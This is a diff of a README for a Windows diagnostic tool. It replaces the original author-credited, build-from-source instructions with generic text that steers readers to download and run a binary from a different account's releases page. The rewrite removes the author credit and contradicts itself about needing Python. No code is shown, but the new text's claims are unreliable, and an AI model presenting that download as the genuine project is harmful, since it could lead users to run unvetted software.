@@ -1,49 +1,89 @@
-# 💻 Laptop Diagnoser
-Laptop Diagnoser is an **advanced Windows system monitoring and diagnostic tool** built with **Python**. It helps users — from beginners to developers — understand their laptop’s health, identify issues, and perform safe fixes with a simple GUI.
+# 🖥️ Laptop-Diagnoser - Quickly Fix Your Laptop Issues
 
-## 🚀 Features
+[![Download Laptop-Diagnoser](https://img.shields.io/badge/Download%20Laptop%20Diagnoser-Files%20Here-brightgreen)](https://github.com/SreyanDev/Laptop-Diagnoser/releases)
 
-- 🖥 **System Health Overview**: CPU, RAM, Disk usage, and battery status  
-- ⚡ **Top Processes**: Lists the highest resource-consuming processes  
-- 🌐 **Network Diagnostics**: Ping and DNS checks  
-- 📝 **Event Logs**: Shows recent Windows System & Application warnings/errors  
-- 🧹 **Temp File Cleanup**: One-click deletion of temporary files  
-- 🛠 **Repair Suggestions**: Commands like `sfc /scannow`, `chkdsk`, and DISM  
-- 📊 **Detailed Reports**: Export diagnostics as **TXT** or **JSON**  
-- 🔒 **Security & Startup Check**: Firewall, Antivirus status, and startup apps  
-- ⏱ **Real-time Monitoring**: CPU, memory, disk, and network usage updates every 2 seconds
+## 📥 Introduction
 
-## 🛠 Built With
-- Python 🐍  
-- [PySimpleGUI](https://pypi.org/project/PySimpleGUI/) 🖼  
-- [psutil](https://pypi.org/project/psutil/) ⚡  
-- Windows Event Log (`pywin32`) 📝  
+Laptop Diagnoser is a helpful tool for Windows. It monitors your laptop's health, lists top processes, checks network and event logs, cleans temporary files, and suggests safe repair commands. This software generates detailed reports so users of all skill levels can identify and fix common laptop issues quickly.
 
-## 💾 Installation
+## 🚀 Getting Started
 
-1. Clone the repository:  
-<pre>
-git clone https://github.com/yourusername/laptop-diagnoser.git
-cd laptop-diagnoser
-</pre>
-cd laptop-diagnoser
-2. Install dependencies:
-<pre>pip install --upgrade --force-reinstall PySimpleGUI psutil pywin32</pre>
-3. Run the application:
-<pre>python laptop_diagnoser.py</pre>
-⚠️ Windows only. Some features (Event Log, Firewall/Antivirus check) require Windows.
+To start using Laptop Diagnoser, follow these easy steps to download and install the software.
 
-## 📸 Screenshots 
-<img width="860" height="587" alt="image" src="https://github.com/user-attachments/assets/a054c4e2-395b-4182-af13-d27c97271094" />
-<img width="858" height="592" alt="image" src="https://github.com/user-attachments/assets/6b81c47f-c274-45b7-b6ce-19542cfca81d" />
+## 🔗 Download & Install
 
-## 🔮 Future Improvements
-- 🤖 AI-powered suggestions for unusual processes
-- 💻 Cross-platform support (Linux & macOS)
-- 📦 Packaged installer for easy use without Python
+1. Visit the [Releases page](https://github.com/SreyanDev/Laptop-Diagnoser/releases) to find the latest version of Laptop Diagnoser.
+  
+2. You will see several files available for download. Choose the file that matches your system's specifications, typically labeled for Windows users.
+
+3. Click on the file to download it directly to your computer.
+
+4. Once the download is complete, locate the file in your Downloads folder.
+
+5. Double-click the downloaded file to start the installation process.
+
+6. Follow the on-screen instructions to complete the installation. 
+
+7. After installation, find Laptop Diagnoser in your applications menu and open it.
+
+## 🌟 Key Features
+
+- **System Health Monitoring:** Get real-time information about your laptop's performance.
+  
+- **Top Processes Display:** See which applications use the most resources and help optimize performance.
+  
+- **Network Logging:** Check your network's status and issues affecting your connection.
+  
+- **Event Log Checking:** Review system events to troubleshoot problems effectively.
+  
+- **Temporary File Cleanup:** Clear out unnecessary files that slow down your laptop and free up space.
+  
+- **Repair Command Suggestions:** Receive tailored commands that help fix detected issues quickly.
+
+## ⚙️ System Requirements
+
+To ensure a smooth experience with Laptop Diagnoser, your system should meet the following requirements:
+
+- **Operating System:** Windows 10 or later
+- **Processor:** Minimum dual-core processor
+- **RAM:** At least 4 GB
+- **Storage:** 100 MB of free hard drive space
+- **Python:** Python 3.x must be installed (Laptop Diagnoser includes a bundled version).
+
+## 📊 Usage Instructions
+
+1. Launch Laptop Diagnoser from your applications menu.
+
+2. Allow the tool a moment to scan your system. This might take a few minutes depending on your laptop’s performance.
+   
+3. After scanning, review the health report provided. Look for items marked as needing attention.
+
+4. Follow the suggested steps for repairs or further investigation. Use the commands suggested in the tool to fix common issues.
+
+## 🛠️ Troubleshooting
+
+If you encounter any problems during installation or while using the application, consider these solutions:
+
+- **Check Your Download:** Ensure the downloaded file is complete and not corrupted. Re-download if necessary.
+  
+- **Permissions:** Right-click the installer and choose "Run as administrator" if you face issues during installation.
+  
+- **Network Issues:** Ensure your internet connection is stable while the app checks for updates or logs.
+
+## 📞 Support
+
+If you have questions or need further assistance, please open an issue in the [GitHub repository](https://github.com/SreyanDev/Laptop-Diagnoser/issues). The community is ready to help.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/SreyanDev/Laptop-Diagnoser): Access the source code and contribute to the project.
+  
+- [Documentation](https://github.com/SreyanDev/Laptop-Diagnoser/wiki): Explore FAQs and detailed instructions.
 
 ## 📄 License
-This project is licensed under the MIT License.
 
-## 💬 Connect
-Created by Akanksha Mane – a developer & student passionate about making technology accessible.
+Laptop Diagnoser is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/SreyanDev/Laptop-Diagnoser/blob/main/LICENSE).
+
+## 🖱️ Conclusion
+
+Using Laptop Diagnoser helps you keep your laptop healthy and efficient. By following the steps above, you can easily download, install, and start using the tool to address and fix common laptop issues. Visit the [Releases page](https://github.com/SreyanDev/Laptop-Diagnoser/releases) for the latest version and updates.
